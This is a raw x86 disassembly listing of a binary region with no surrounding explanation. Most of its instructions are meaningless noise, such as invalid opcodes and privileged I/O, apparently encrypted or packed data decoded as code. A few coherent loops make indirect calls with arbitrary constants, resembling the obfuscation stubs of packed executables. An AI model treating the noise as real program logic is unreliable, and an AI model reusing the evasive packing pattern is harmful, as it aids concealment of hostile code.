  4129c8:	xor    ebx,DWORD PTR [ecx]
  4129ca:	sub    esp,DWORD PTR [ecx]
  4129cc:	jge    0x4129ee
  4129ce:	xchg   ecx,eax
  4129cf:	pop    esi
  4129d0:	mov    eax,edi
  4129d2:	pop    ebx
  4129d3:	xor    al,al
  4129d5:	je     0x412a47
  4129d7:	call   0x8ad751e0
  4129dc:	lds    ebx,FWORD PTR [esp+eiz*4-0x477f4b19]
  4129e3:	sub    BYTE PTR cs:[edx-0x623aae72],ah
  4129ea:	mov    ecx,0xbf629f73
  4129ef:	inc    ebx
  4129f0:	cdq    
  4129f1:	ins    BYTE PTR es:[edi],dx
  4129f2:	stc    
  4129f3:	and    ah,BYTE PTR [esi]
  4129f5:	lods   al,BYTE PTR ds:[esi]
  4129f6:	hlt    
  4129f7:	adc    BYTE PTR [eax+0xa8588f8],dl
  4129fd:	xchg   ebp,eax
  4129fe:	in     al,dx
  4129ff:	fdiv   st,st(4)
  412a01:	mov    ds:0x2a6d89fe,al
  412a06:	mov    ebp,0xb7652a97
  412a0b:	sub    al,0x65
  412a0d:	cmp    ch,BYTE PTR [eax-0x7d91a2ec]
  412a13:	inc    esi
  412a14:	pushf  
  412a15:	xor    ah,BYTE PTR [ebp+0x6f55cfc9]
  412a1b:	mov    edx,0x795b0abc
  412a20:	jo     0x412a3a
  412a22:	push   ss
  412a23:	mov    ch,0x7c
  412a25:	sar    ah,1
  412a27:	addr16 leave 
  412a29:	outs   dx,BYTE PTR ds:[esi]
  412a2a:	mov    ecx,0x714bc2c3
  412a2f:	cmp    ebx,esi
  412a31:	int    0xc
  412a33:	xor    eax,DWORD PTR ds:0xc4c0058b
  412a39:	or     al,0x97
  412a3b:	inc    eax
  412a3c:	test   al,0x69
  412a3e:	in     eax,0x57
  412a40:	mov    al,0xc4
  412a42:	adc    DWORD PTR [ebx-0x5c6fe03d],esp
  412a48:	inc    ebx
  412a49:	fs jb  0x412a6f
  412a4c:	std    
  412a4d:	es loopne 0x412a98
  412a50:	or     ebx,0xd21d1737
  412a56:	pop    ebx
  412a57:	dec    ecx
  412a58:	cmp    edi,esi
  412a5a:	cmp    edx,esi
  412a5c:	je     0x412a4f
  412a5e:	fist   DWORD PTR [eax-0x2a]
  412a61:	dec    esi
  412a62:	cmp    bl,BYTE PTR [edx]
  412a64:	faddp  st(5),st
  412a66:	add    DWORD PTR [esi+0x69f05f3e],ebp
  412a6c:	push   ss
  412a6d:	push   0x58e3b035
  412a72:	aad    0xda
  412a74:	pop    edi
  412a75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a76:	push   edx
  412a77:	ins    BYTE PTR es:[edi],dx
  412a78:	xchg   edi,ecx
  412a7a:	push   ebp
  412a7b:	dec    ebx
  412a7c:	dec    eax
  412a7d:	jmp    0xd9be4d8c
  412a82:	clc    
  412a83:	ds pop ebx
  412a85:	sub    eax,0xbbe99672
  412a8a:	stos   DWORD PTR es:[edi],eax
  412a8b:	dec    edi
  412a8c:	pop    esi
  412a8d:	mov    esp,0x840fc46f
  412a92:	adc    BYTE PTR [eax],al
  412a94:	add    BYTE PTR [eax],al
  412a96:	mov    ecx,DWORD PTR [ebp+0x14]
  412a99:	add    edi,DWORD PTR ds:0x42e120
  412a9f:	mov    ecx,DWORD PTR [ecx]
  412aa1:	or     esi,esi
  412aa3:	mov    DWORD PTR [ebp-0x1c],ecx
  412aa6:	mov    DWORD PTR ds:0x42fcf5,0x17
  412ab0:	cmp    DWORD PTR ds:0x42fcf5,0x0
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fcf5,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e317
  412af1:	mov    edi,DWORD PTR ds:0x42fcf5
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fcf5,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e128
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e118,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412b86
  412b3b:	cmp    eax,0x66110f2a
  412b40:	jo     0x412bb2
  412b42:	mov    ecx,0xa870707e
  412b47:	cli    
  412b48:	lods   eax,DWORD PTR ds:[esi]
  412b49:	loopne 0x412b4c
  412b4b:	dec    eax
  412b4c:	and    al,0xba
  412b4e:	add    BYTE PTR [edi],ah
  412b50:	pop    esp
  412b51:	adc    dl,BYTE PTR ds:0xd76f9acd
  412b57:	lock jmp 0x1eb3:0x5fe5e801
  412b5f:	outs   dx,DWORD PTR ds:[esi]
  412b60:	ins    BYTE PTR es:[edi],dx
  412b61:	out    0x8b,al
  412b63:	test   al,0x50
  412b65:	push   cs
  412b66:	pop    ebx
  412b67:	dec    ebx
  412b68:	lods   al,BYTE PTR ds:[esi]
  412b69:	adc    eax,0x1c3f4a4c
  412b6e:	inc    ebp
  412b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b70:	pop    esp
  412b71:	scas   al,BYTE PTR es:[edi]
  412b72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b73:	adc    DWORD PTR [ecx-0x1b5d5ab6],edi
  412b79:	sub    eax,edi
  412b7b:	popa   
  412b7c:	shl    ch,cl
  412b7e:	test   bh,dh
  412b80:	scas   al,BYTE PTR es:[edi]
  412b81:	stos   DWORD PTR es:[edi],eax
  412b82:	lahf   
  412b83:	inc    eax
  412b84:	mov    esp,0xa4b0b6df
  412b89:	xchg   edi,eax
  412b8a:	mov    bl,0xf2
  412b8c:	xchg   ecx,eax
  412b8d:	lods   eax,DWORD PTR ds:[esi]
  412b8e:	(bad)  
  412b8f:	out    dx,eax
  412b90:	dec    ecx
  412b91:	push   cs
  412b92:	aas    
  412b93:	or     al,0x55
  412b95:	or     eax,ecx
  412b97:	push   eax
  412b98:	daa    
  412b99:	sbb    eax,0x569c85fe
  412b9e:	xor    BYTE PTR [ebx],0x19
  412ba1:	sbb    edi,esp
  412ba3:	jl     0x412b43
  412ba5:	pop    ecx
  412ba6:	or     BYTE PTR [edx],al
  412ba8:	and    cl,BYTE PTR [edx+0x35]
  412bab:	xchg   ebx,eax
  412bac:	in     eax,dx
  412bad:	pop    ebp
  412bae:	pop    ebp
  412baf:	sub    esi,DWORD PTR [edx]
  412bb1:	inc    eax
  412bb2:	jmp    0x412c2a
  412bb4:	jns    0x412bf2
  412bb6:	daa    
  412bb7:	les    ebx,FWORD PTR [ebp-0x4b2bcd10]
  412bbd:	mov    dh,0xad
  412bbf:	xchg   ebp,eax
  412bc0:	pop    eax
  412bc1:	push   ebx
  412bc2:	fisub  WORD PTR [edi]
  412bc4:	loope  0x412b94
  412bc6:	sbb    ebp,DWORD PTR [ebp-0x6b]
  412bc9:	cmp    BYTE PTR [edx-0x76],bl
  412bcc:	out    0x7f,al
  412bce:	jge    0x412c38
  412bd0:	add    cl,BYTE PTR [ebx-0x52be99e2]
  412bd6:	jmp    DWORD PTR [eax-0x308e5627]
  412bdc:	lds    esi,FWORD PTR [eax-0xeb3006a]
  412be2:	pusha  
  412be3:	pop    ds
  412be4:	push   esi
  412be5:	inc    edi
  412be6:	(bad)  
  412be7:	das    
  412be8:	and    edx,DWORD PTR [ebx]
  412bea:	push   ds
  412beb:	stos   BYTE PTR es:[edi],al
  412bec:	cli    
  412bed:	cmovnp ebx,edi
  412bf0:	inc    eax
  412bf1:	out    0x3a,al
  412bf3:	rcr    DWORD PTR [esi-0x6cf83575],0xa
  412bfa:	jmp    0xfb438218
  412bff:	pop    edi
  412c00:	mov    bl,0xf
  412c02:	push   0xac0705ef
  412c07:	jle    0x412bc7
  412c09:	mov    DWORD PTR [ebp-0x6a6c2822],edi
  412c0f:	mov    dh,0xf7
  412c11:	jle    0x412bb5
  412c13:	sbb    esi,0xffffffe0
  412c16:	sbb    edi,ebx
  412c18:	lea    edi,[ebx-0x63]
  412c1b:	in     eax,dx
  412c1c:	push   edi
  412c1d:	test   DWORD PTR [eax+0x3f851050],edx
  412c23:	iret   
  412c24:	call   0x6d9adcee
  412c29:	push   0x2dee8834
  412c2e:	pusha  
  412c2f:	jo     0x412c2b
  412c31:	cwde   
  412c32:	stos   DWORD PTR es:[edi],eax
  412c33:	adc    al,0x7d
  412c35:	cmp    BYTE PTR [eax],dh
  412c37:	or     BYTE PTR [ecx+ebx*1+0x3d],ah
  412c3b:	add    ebx,DWORD PTR [esi+0x36]
  412c3e:	or     eax,0x813ca632
  412c43:	mov    edi,0xf6ad2863
  412c48:	dec    esp
  412c49:	mov    ch,0x57
  412c4b:	stos   DWORD PTR es:[edi],eax
  412c4c:	ja     0x412c17
  412c4e:	daa    
  412c4f:	sub    al,0x65
  412c51:	in     eax,dx
  412c52:	mov    ecx,0x86c953e0
  412c57:	int3   
  412c58:	or     eax,0x531be947
  412c5d:	add    eax,DWORD PTR [edi+0x72]
  412c60:	popa   
  412c61:	push   edi
  412c62:	xchg   esi,eax
  412c63:	cmp    ebx,DWORD PTR [ecx-0x1acd8634]
  412c69:	ret    
  412c6a:	inc    edx
  412c6b:	jl     0x412bf0
  412c6d:	add    eax,0x9ef48ec0
  412c72:	adc    BYTE PTR [ecx+0x44078fd4],al
  412c78:	sub    eax,0x9a50a015
  412c7d:	xchg   edi,eax
  412c7e:	dec    ebx
  412c7f:	inc    esp
  412c80:	jo     0x412cf9
  412c82:	enter  0xa4f6,0xf7
  412c86:	loope  0x412c4a
  412c88:	je     0x412ce0
  412c8a:	loopne 0x412c40
  412c8c:	jp     0x412c0f
  412c8e:	scas   eax,DWORD PTR es:[edi]
  412c8f:	leave  
  412c90:	cwde   
  412c91:	pop    esi
  412c92:	pop    esi
  412c93:	sbb    al,BYTE PTR [esi-0x59]
  412c96:	sbb    ebp,DWORD PTR ds:0x447b9f33
  412c9c:	mov    ds,WORD PTR [edx]
  412c9e:	xchg   ecx,eax
  412c9f:	xchg   ecx,eax
  412ca0:	inc    ebx
  412ca1:	int3   
  412ca2:	pusha  
  412ca3:	aam    0x35
  412ca5:	pop    esi
  412ca6:	inc    edi
  412ca7:	jmp    0x1960:0x195dce6f
  412cae:	cmp    ch,BYTE PTR [ecx+0x3fcadab6]
  412cb4:	in     eax,dx
  412cb5:	add    DWORD PTR [ebp-0x555ac76],0x9082e013
  412cbf:	jne    0x412c6f
  412cc1:	mov    edx,0xddb7afb0
  412cc6:	clc    
  412cc7:	test   DWORD PTR [esp+eiz*4+0x2f],edx
  412ccb:	hlt    
  412ccc:	sbb    BYTE PTR [di-0x4f],bh
  412cd0:	pop    ebx
  412cd1:	add    DWORD PTR [edi-0x4f],eax
  412cd4:	ret    
  412cd5:	test   eax,0x97c698da
  412cda:	xor    BYTE PTR [eax],0x83
  412cdd:	stos   DWORD PTR es:[edi],eax
  412cde:	cld    
  412cdf:	imul   eax,DWORD PTR [ecx],0x32475482
  412ce5:	adc    ebx,ebp
  412ce7:	or     ecx,0xffffffb2
  412cea:	loope  0x412cb1
  412cec:	sub    eax,0x518e1ab1
  412cf1:	adc    BYTE PTR [ecx],al
  412cf3:	inc    ecx
  412cf4:	gs inc ebx
  412cf6:	fwait
  412cf7:	inc    ecx
  412cf8:	dec    ebx
  412cf9:	cmc    
  412cfa:	stc    
  412cfb:	ins    DWORD PTR es:[edi],dx
  412cfc:	and    al,0xf1
  412cfe:	out    dx,al
  412cff:	mov    fs,WORD PTR [ebp-0x51c372a]
  412d05:	or     eax,DWORD PTR [ebp-0x5740d0b]
  412d0b:	ds fwait
  412d0d:	xchg   edi,eax
  412d0e:	or     esi,ecx
  412d10:	fild   DWORD PTR ds:0x9886612c
  412d16:	(bad)  
  412d17:	(bad)  
  412d18:	call   0xd141:0xd36b7c1b
  412d1f:	cmp    BYTE PTR [edi-0x68187cda],bh
  412d25:	ins    DWORD PTR es:[edi],dx
  412d26:	or     BYTE PTR [eax-0x2ec9b0de],0x3e
  412d2d:	(bad)
  412d30:	cmp    esp,DWORD PTR [ebx+0x34]
  412d33:	shl    BYTE PTR [esi],0x51
  412d36:	mov    esp,0x1a97807b
  412d3b:	not    eax
  412d3d:	sbb    DWORD PTR [edi+esi*1],edx
  412d40:	imul   ebx,DWORD PTR [ebx],0xffffffe0
  412d43:	pushf  
  412d44:	push   0xe04fd6f6
  412d49:	ret    0x3e69
  412d4c:	lods   eax,DWORD PTR ds:[esi]
  412d4d:	adc    BYTE PTR [ebx],dh
  412d4f:	add    al,0xdb
  412d51:	ret    
  412d52:	cmp    al,dl
  412d54:	cld    
  412d55:	repz (bad) 
  412d57:	jmp    0x8cf4:0x83e594e5
  412d5e:	fsubrp st(4),st
  412d60:	es adc eax,0x6e140636
  412d66:	mov    BYTE PTR [eax+0x57e08f4a],ch
  412d6c:	pop    ss
  412d6d:	sub    al,0xab
  412d6f:	stos   BYTE PTR es:[edi],al
  412d70:	sbb    DWORD PTR [ebx+0x26f480b9],edx
  412d76:	(bad)  
  412d78:	aad    0x42
  412d7a:	retf   
  412d7b:	outs   dx,BYTE PTR ds:[esi]
  412d7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d7d:	push   ebp
  412d7e:	retf   
  412d7f:	loope  0x412d10
  412d81:	add    eax,0xd75d54ef
  412d86:	and    al,0xde
  412d88:	test   BYTE PTR ds:0xbc990c78,bl
  412d8e:	aaa    
  412d8f:	in     eax,dx
  412d90:	sti    
  412d91:	push   0x62a57d48
  412d96:	jnp    0x412d3c
  412d98:	sar    BYTE PTR [edi-0x997036e],cl
  412d9e:	stc    
  412d9f:	push   ecx
  412da0:	bound  edx,QWORD PTR [ebx]
  412da2:	mov    eax,0x2da5b496
  412da7:	popf   
  412da8:	pop    ebx
  412da9:	ja     0x412df5
  412dab:	xchg   edi,eax
  412dac:	cs xchg edx,eax
  412dae:	cdq    
  412daf:	fidivr DWORD PTR [ecx-0x15]
  412db2:	adc    dl,BYTE PTR [edx+edx*1+0x4609575e]
  412db9:	int3   
  412dba:	mov    ah,0x9a
  412dbc:	mov    ds:0x50267633,eax
  412dc1:	pop    ebx
  412dc2:	push   ss
  412dc3:	jle    0x412dbc
  412dc5:	sub    al,0xee
  412dc7:	pop    ss
  412dc8:	lds    ebp,FWORD PTR [esi+0x4ced38c5]
  412dce:	jp     0x412d7e
  412dd0:	test   al,0x56
  412dd2:	xchg   DWORD PTR [esi],ebp
  412dd4:	ins    DWORD PTR es:[edi],dx
  412dd5:	mov    ebx,0xf9c75bf9
  412dda:	xlat   BYTE PTR ds:[ebx]
  412ddb:	nop
  412ddc:	dec    edx
  412ddd:	leave  
  412dde:	cdq    
  412ddf:	daa    
  412de0:	sbb    al,0xf1
  412de2:	sub    eax,eax
  412de4:	nop
  412de5:	inc    BYTE PTR [ebx]
  412de7:	mov    ecx,0x4dec78fb
  412dec:	and    al,0x82
  412dee:	into   
  412def:	stos   BYTE PTR es:[edi],al
  412df0:	clc    
  412df1:	jmp    0x9995b8d2
  412df6:	in     eax,0x26
  412df8:	jnp    0x412df7
  412dfa:	mov    ds:0xd11f632f,al
  412dff:	fcmovnbe st,st(4)
  412e01:	pop    eax
  412e02:	mov    al,0x1d
  412e04:	das    
  412e05:	mov    eax,ds:0xb627d2ae
  412e0a:	por    mm5,mm2
  412e0d:	xchg   esi,ecx
  412e0f:	and    DWORD PTR ds:0x42e11c,0x0
  412e19:	jmp    0x412e2d
  412e1e:	xor    ecx,ecx
  412e20:	add    ecx,DWORD PTR ds:0x42e11c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e11c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e11c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e11c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e487
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [ebp-0x21],bx
  412e77:	xchg   ebx,eax
  412e78:	jl     0x412ed4
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0x870707e
  412e82:	xor    DWORD PTR [esi],0xffffff96
  412e85:	lock mov al,0xf7
  412e88:	lahf   
  412e89:	mov    bl,BYTE PTR [edi+0x583ba98f]
  412e8f:	lahf   
  412e90:	xor    al,0x9b
  412e92:	pop    ebx
  412e93:	sahf   
  412e94:	jne    0x412e61
  412e96:	add    ebp,DWORD PTR [edi-0x49]
  412e99:	add    eax,0x2f71db2e
  412e9e:	fadd   DWORD PTR [ecx+eiz*2+0x59]
  412ea2:	lods   eax,DWORD PTR ds:[esi]
  412ea3:	repz adc dl,ch
  412ea6:	mov    bl,BYTE PTR [edx+0x1f0dd492]
  412eac:	test   al,0x3c
  412eae:	xchg   edi,eax
  412eaf:	mov    bh,0xe0
  412eb1:	jl     0x412ecb
  412eb3:	je     0x412e5f
  412eb5:	mov    eax,ds:0x7ec89db5
  412eba:	push   esi
  412ebb:	aam    0xb
  412ebd:	xor    esi,DWORD PTR [edi+0x1f7a073a]
  412ec3:	mov    dh,0x87
  412ec5:	imul   esi,DWORD PTR [ebx],0xf2ef3b77
  412ecb:	cmp    DWORD PTR [ebx],0x76
  412ece:	jmp    0x397e7de8
  412ed3:	sbb    eax,0x153b74ac
  412ed8:	stos   BYTE PTR es:[edi],al
  412ed9:	fsub   DWORD PTR [edx-0x6c674aa1]
  412edf:	(bad)  
  412ee1:	cwde   
  412ee2:	inc    eax
  412ee3:	and    eax,0x128de283
  412ee8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ee9:	xor    al,0x89
  412eeb:	pop    ebx
  412eec:	(bad)  
  412eed:	stc    
  412eee:	and    ebp,DWORD PTR [edx]
  412ef0:	push   ds
  412ef1:	mul    ecx
  412ef3:	adc    al,0x34
  412ef5:	xchg   ebx,eax
  412ef6:	add    al,0x3
  412ef8:	adc    bh,BYTE PTR [ebx-0x58d79ec8]
  412efe:	lods   al,BYTE PTR ds:[esi]
  412eff:	mov    bl,ch
  412f01:	push   edi
  412f02:	ins    DWORD PTR es:[edi],dx
  412f03:	loope  0x412ed1
  412f05:	and    ecx,DWORD PTR [edi+edi*8]
  412f08:	in     al,0x56
  412f0a:	mov    ebx,0x3d106ae7
  412f0f:	(bad)  
  412f10:	(bad)  
  412f11:	mov    bh,0x53
  412f13:	mov    bl,0x49
  412f15:	sbb    eax,0x1f36d1
  412f1a:	pop    ds
  412f1b:	and    eax,0x49e1fbbc
  412f20:	mov    DWORD PTR [ebp+0x67],esi
  412f23:	jns    0x412fa4
  412f25:	cli    
  412f26:	adc    BYTE PTR [ebx+0x5c],al
  412f29:	hlt    
  412f2a:	add    eax,DWORD PTR [eax-0x4e]
  412f2d:	in     eax,dx
  412f2e:	inc    ebp
  412f2f:	ret    0xc0c0
  412f32:	aam    0x74
  412f34:	push   ss
  412f35:	push   eax
  412f36:	into   
  412f37:	xlat   BYTE PTR ds:[ebx]
  412f38:	mov    edi,0x1af4fae0
  412f3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f3e:	cwde   
  412f3f:	mov    edx,0xc6b5206d
  412f44:	xchg   esp,eax
  412f45:	popf   
  412f46:	xor    BYTE PTR [ecx+0x62385cf],dh
  412f4c:	push   es
  412f4d:	(bad)  
  412f4e:	pop    ecx
  412f4f:	repnz test BYTE PTR [esi+0x52f4d4bb],bh
  412f56:	cld    
  412f57:	leave  
  412f58:	jb     0x412f90
  412f5a:	adc    BYTE PTR [edx],bl
  412f5c:	fidiv  DWORD PTR [edx-0x62f74966]
  412f62:	scas   al,BYTE PTR es:[edi]
  412f63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f64:	pop    es
  412f65:	mov    bl,BYTE PTR [edi]
  412f67:	scas   al,BYTE PTR es:[edi]
  412f68:	test   BYTE PTR [ebx+0x105c389d],bh
  412f6e:	jmp    0x3c21:0x2d3ff1da
  412f75:	inc    ebp
  412f76:	fist   WORD PTR [ebx]
  412f78:	pop    esp
  412f79:	out    0x25,eax
  412f7b:	cs and al,0x98
  412f7e:	test   DWORD PTR [ebx-0x53c77f6],eax
  412f84:	addr16 int 0xab
  412f87:	pusha  
  412f88:	sahf   
  412f89:	les    ebp,FWORD PTR [ebx-0x346f33cb]
  412f8f:	and    ch,BYTE PTR [ebx+0x6f]
  412f92:	es (bad) 
  412f94:	ja     0x412f70
  412f96:	adc    BYTE PTR [edi+esi*8+0x77],al
  412f9a:	test   DWORD PTR [ecx],edi
  412f9c:	mov    al,0x60
  412f9e:	jo     0x412fd8
  412fa0:	aad    0x1d
  412fa2:	or     eax,0x47
  412fa5:	add    bl,BYTE PTR [edi+0x3d0b8b0f]
  412fab:	push   eax
  412fac:	mov    BYTE PTR ds:0x758c9f98,cl
  412fb2:	sbb    bl,dl
  412fb4:	xor    DWORD PTR [esi],edi
  412fb6:	aas    
  412fb7:	lea    esi,[edi+0x2da8bda9]
  412fbd:	xor    esi,edx
  412fbf:	stos   BYTE PTR es:[edi],al
  412fc0:	pop    edx
  412fc1:	xchg   BYTE PTR [ecx],al
  412fc3:	cmp    eax,0xf6c2cf8f
  412fc8:	pop    ecx
  412fc9:	mov    eax,0xb0b92867
  412fce:	or     BYTE PTR [ebp-0x4c],ah
  412fd1:	adc    edx,DWORD PTR [eax]
  412fd3:	or     esp,DWORD PTR [edx+0xcd79cd5]
  412fd9:	imul   ebp,ebx,0xb6ec987b
  412fdf:	pushf  
  412fe0:	dec    edi
  412fe1:	sub    bh,BYTE PTR [esi]
  412fe3:	sbb    ebx,esp
  412fe5:	shr    bh,1
  412fe7:	cdq    
  412fe8:	in     al,dx
  412fe9:	lahf   
  412fea:	mov    ss,WORD PTR [edi+0x65]
  412fed:	ret    
  412fee:	int3   
  412fef:	cmp    esp,DWORD PTR [ecx+0x8]
  412ff2:	pop    ds
  412ff3:	inc    edi
  412ff4:	lock arpl WORD PTR [edx-0x55d666e6],di
  412ffb:	gs jns 0x413013
  412ffe:	jns    0x413007
  413000:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413001:	icebp  
  413002:	inc    edx
  413003:	xor    dl,BYTE PTR [esi]
  413005:	fist   DWORD PTR [edx+0x4e76bab4]
  41300b:	sub    edx,ebx
  41300d:	mov    cl,0x52
  41300f:	fidiv  WORD PTR [esi-0x3a95e9da]
  413015:	mov    bh,0x48
  413017:	mov    edi,0xc0232e4f
  41301c:	ins    BYTE PTR es:[edi],dx
  41301d:	int3   
  41301e:	test   al,0xd0
  413020:	mov    ah,0x3b
  413022:	dec    esi
  413023:	cmp    ebp,ebp
  413025:	jg     0x413038
  413027:	sub    esi,eax
  413029:	jl     0x41308c
  41302b:	ins    BYTE PTR es:[edi],dx
  41302c:	bound  edx,QWORD PTR [ebx+ebp*2+0x3673ebac]
  413033:	adc    esp,0xcf7edb66
  413039:	test   DWORD PTR [ebx+0x1b91ea6f],ebx
  41303f:	pop    ebx
  413040:	push   esi
  413041:	data16 aas 
  413043:	loopne 0x413000
  413045:	(bad)  
  413046:	stos   DWORD PTR es:[edi],eax
  413047:	cmp    esp,DWORD PTR [edi]
  413049:	mov    ebp,0x34c091a8
  41304e:	jl     0x412ffd
  413050:	cdq    
  413051:	fst    DWORD PTR [edi+0x22761ce8]
  413057:	cs sub edx,ebp
  41305a:	jno    0x41300b
  41305c:	aas    
  41305d:	stos   BYTE PTR es:[edi],al
  41305e:	jno    0x41306c
  413060:	neg    DWORD PTR [edx+0x3033a337]
  413066:	dec    BYTE PTR [ecx+edi*1+0x59]
  41306a:	ret    
  41306b:	ja     0x41301b
  41306d:	mov    ds:0xd8ab143f,eax
  413072:	ficomp WORD PTR [ebx+0x6b978615]
  413078:	jg     0x41307b
  41307a:	cmp    al,0xb1
  41307c:	bound  ecx,QWORD PTR [edi+0x58e8055e]
  413082:	sub    ebx,DWORD PTR [ecx-0x39]
  413085:	shr    BYTE PTR [ebp-0x23],1
  413088:	(bad)  
  413089:	call   DWORD PTR [eax]
  41308b:	sub    eax,0xd399555c
  413090:	push   ebp
  413091:	in     eax,0xf5
  413093:	ins    DWORD PTR es:[edi],dx
  413094:	pop    ds
  413095:	ficomp WORD PTR [edi-0x51323ab1]
  41309b:	xor    ah,0xaa
  41309e:	and    al,0x30
  4130a0:	xchg   ebp,esi
  4130a2:	pop    esp
  4130a3:	sub    al,0xa4
  4130a5:	mov    ecx,0xb5280091
  4130aa:	push   cs
  4130ab:	mov    eax,ds:0x28f97029
  4130b0:	sbb    DWORD PTR [esp+ebp*8+0x4b0a673d],ecx
  4130b7:	cwde   
  4130b8:	jnp    0x413107
  4130ba:	stos   DWORD PTR es:[edi],eax
  4130bb:	imul   ebp,esp,0x9ccfbdba
  4130c1:	in     eax,dx
  4130c2:	and    al,0xc3
  4130c4:	pop    ds
  4130c5:	xchg   cl,al
  4130c7:	xor    eax,0xd4c4c458
  4130cc:	jmp    0x4130e4
  4130ce:	push   es
  4130cf:	mov    esp,0xfa4dab86
  4130d4:	mov    ds,WORD PTR [ecx-0x6]
  4130d7:	and    cl,cl
  4130d9:	lods   al,BYTE PTR ds:[esi]
  4130da:	xchg   edi,eax
  4130db:	push   ebx
  4130dc:	pusha  
  4130dd:	imul   ebx,DWORD PTR [edx+0x10de6bae],0xfffffffe
  4130e4:	scas   eax,DWORD PTR es:[edi]
  4130e5:	dec    esi
  4130e6:	xor    dh,BYTE PTR [ebp+eiz*1-0x6e]
  4130ea:	mov    DWORD PTR [esi],ecx
  4130ec:	mov    eax,0x9ddb83d2
  4130f1:	jne    0x413155
  4130f3:	je     0x4130f6
  4130f5:	xlat   BYTE PTR ds:[ebx]
  4130f6:	push   eax
  4130f7:	sbb    BYTE PTR [ecx+eax*8],0x48
  4130fb:	test   esi,ecx
  4130fd:	jmp    0xc818d475
  413102:	into   
  413103:	push   cs
  413104:	ins    DWORD PTR es:[edi],dx
  413105:	rcr    al,1
  413107:	in     al,dx
  413108:	cwde   
  413109:	sbb    al,0xf8
  41310b:	lahf   
  41310c:	xor    DWORD PTR [ecx],esi
  41310e:	daa    
  41310f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413110:	jne    0x41310d
  413112:	cmp    eax,0x2b2231f6
  413117:	daa    
  413118:	xor    al,0x6
  41311a:	xor    BYTE PTR [eax],al
  41311c:	ficom  WORD PTR [ebp+0x12b3a1c9]
  413122:	pop    edx
  413123:	mov    edx,0x4a0237f
  413128:	in     eax,dx
  413129:	or     BYTE PTR [ebx-0x5a],cl
  41312c:	xchg   BYTE PTR [esi-0x1cf1699f],cl
  413132:	mov    bl,0x1e
  413134:	pop    edx
  413135:	mov    ecx,0xfa6bdf8d
  41313a:	dec    eax
  41313b:	out    dx,eax
  41313c:	sahf   
  41313d:	test   DWORD PTR [ecx+0x1195313f],esi
  413143:	fld    DWORD PTR [ebp-0x7659853e]
  413149:	jne    0x413123
  41314b:	mov    DWORD PTR [ebp-0x2c],esi
  41314e:	mov    DWORD PTR [ebp-0x14],esi
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fcf9
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e128,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	inc    ecx
  41317f:	pop    edi
  413180:	sbb    DWORD PTR [esi+0x707061a3],ebp
  413186:	mov    ecx,0xc470707e
  41318b:	push   0xffffffd1
  41318d:	cmp    DWORD PTR [ebx-0x304944d7],0x70df126f
  413197:	cmp    eax,0x1b1d86db
  41319c:	dec    ecx
  41319d:	inc    ecx
  41319e:	test   eax,0x2cbf892f
  4131a3:	enter  0x86c0,0x7e
  4131a7:	pop    ecx
  4131a8:	cli    
  4131a9:	adc    BYTE PTR [edi-0x7927d4c],ch
  4131af:	pushf  
  4131b0:	mov    al,BYTE PTR [ecx-0x56]
  4131b3:	lahf   
  4131b4:	lods   al,BYTE PTR ds:[esi]
  4131b5:	pop    ebx
  4131b6:	xchg   esi,eax
  4131b7:	fnstcw WORD PTR [esi-0x51d0bc35]
  4131bd:	rcr    ebx,0xd3
  4131c0:	pop    ecx
  4131c1:	mov    ch,0xcf
  4131c3:	stos   DWORD PTR es:[edi],eax
  4131c4:	sbb    DWORD PTR [esi+esi*1+0x53a6e3ce],eax
  4131cb:	and    al,BYTE PTR [esi-0x22]
  4131ce:	or     eax,0xcbea9623
  4131d3:	pop    eax
  4131d4:	retf   
  4131d5:	mov    bl,0xa9
  4131d7:	retf   
  4131d8:	leave  
  4131d9:	cdq    
  4131da:	aad    0x97
